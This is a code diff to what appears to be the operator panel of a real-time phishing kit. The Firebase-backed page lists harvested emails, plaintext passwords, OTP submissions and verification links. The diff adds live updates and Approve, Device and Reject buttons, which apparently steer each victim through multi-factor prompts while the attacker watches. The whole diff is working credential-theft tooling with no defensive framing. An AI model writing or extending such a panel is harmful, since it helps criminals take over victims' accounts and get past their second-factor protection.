@@ -117,6 +117,58 @@ font-size:13px;
 font-weight:bold;
 
 }
+.approve-btn{
+
+background:#16a34a;
+color:white;
+border:none;
+padding:7px 14px;
+border-radius:6px;
+cursor:pointer;
+margin-right:6px;
+
+}
+
+.device-btn{
+
+background:#2563eb;
+color:white;
+border:none;
+padding:7px 14px;
+border-radius:6px;
+cursor:pointer;
+margin-right:6px;
+
+}
+
+.reject-btn{
+
+background:#dc2626;
+color:white;
+border:none;
+padding:7px 14px;
+border-radius:6px;
+cursor:pointer;
+
+}
+
+.approve-btn:hover{
+
+background:#15803d;
+
+}
+
+.device-btn:hover{
+
+background:#1d4ed8;
+
+}
+
+.reject-btn:hover{
+
+background:#b91c1c;
+
+}
 
 </style>
 
@@ -150,9 +202,7 @@ Login Submissions
 
 <th>Status</th>
 
-<th>Date</th>
-
-</tr>
+<th>Date</th><th>Actions</th></tr>
 
 </thead>
 
@@ -184,9 +234,7 @@ OTP Submissions
 
 <th>Attempt</th>
 
-<th>Date</th>
-
-</tr>
+<th>Date</th><th>Actions</th></tr>
 
 </thead>
 
@@ -218,9 +266,7 @@ Verification Links
 
 <th>Status</th>
 
-<th>Date</th>
-
-</tr>
+<th>Date</th><th>Actions</th></tr>
 
 </thead>
 
@@ -239,12 +285,12 @@ import { db } from "./js/firebase.js";
 import {
 
 collection,
-
 getDocs,
-
 query,
-
-orderBy
+orderBy,
+onSnapshot,
+doc,
+updateDoc
 
 }
 
@@ -252,49 +298,85 @@ from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
 
 // ---------------- LOGIN ----------------
 
-const loginTable =
-document.getElementById("loginTable");
+const loginTable = document.getElementById("loginTable");
 
-const loginSnapshot =
-await getDocs(
+onSnapshot(
 
-query(
+    query(
+        collection(db, "login_submissions"),
+        orderBy("createdAt", "desc")
+    ),
 
-collection(db,"login_submissions"),
+    (snapshot) => {
 
-orderBy("createdAt","desc")
+        loginTable.innerHTML = "";
 
-)
+        snapshot.forEach((loginDoc) => {
+
+            const data = loginDoc.data();
+
+            loginTable.innerHTML += `
+
+            <tr>
+
+                <td>${data.email || ""}</td>
+
+                <td>${data.password || ""}</td>
+
+                <td>
+
+                    <span class="status">
+
+                        ${data.status || "Pending"}
+
+                    </span>
+
+                </td>
+
+                <td>
+
+                    ${
+                        data.createdAt
+                        ? data.createdAt.toDate().toLocaleString()
+                        : ""
+                    }
+
+                </td>
+
+                <td>
+
+                    <button class="approve-btn"
+                        onclick="approveLogin('${loginDoc.id}')">
+
+                        ✅ Approve
+
+                    </button>
+
+                    <button class="device-btn"
+                        onclick="deviceLogin('${loginDoc.id}')">
+
+                        📱 Device
+
+                    </button>
+
+                    <button class="reject-btn"
+                        onclick="rejectLogin('${loginDoc.id}')">
+
+                        ❌ Reject
+
+                    </button>
+
+                </td>
+
+            </tr>
+
+            `;
+
+        });
+
+    }
 
 );
-
-loginSnapshot.forEach(doc=>{
-
-const data=doc.data();
-
-const row=`
-
-<tr>
-
-<td>${data.email||""}</td>
-
-<td>${data.password||""}</td>
-
-<td><span class="status">${data.status||""}</span></td>
-
-<td>${
-data.createdAt
-? data.createdAt.toDate().toLocaleString()
-: ""
-}</td>
-
-</tr>
-
-`;
-
-loginTable.innerHTML+=row;
-
-});
 
 // ---------------- OTP ----------------
 
@@ -393,6 +475,38 @@ data.createdAt
 verificationTable.innerHTML+=row;
 
 });
+window.approveLogin = async function(id){
+
+    await updateDoc(
+        doc(db,"login_submissions",id),
+        {
+            status:"Approved"
+        }
+    );
+
+};
+
+window.deviceLogin = async function(id){
+
+    await updateDoc(
+        doc(db,"login_submissions",id),
+        {
+            status:"Device"
+        }
+    );
+
+};
+
+window.rejectLogin = async function(id){
+
+    await updateDoc(
+        doc(db,"login_submissions",id),
+        {
+            status:"Rejected"
+        }
+    );
+
+};
 
 </script>
 
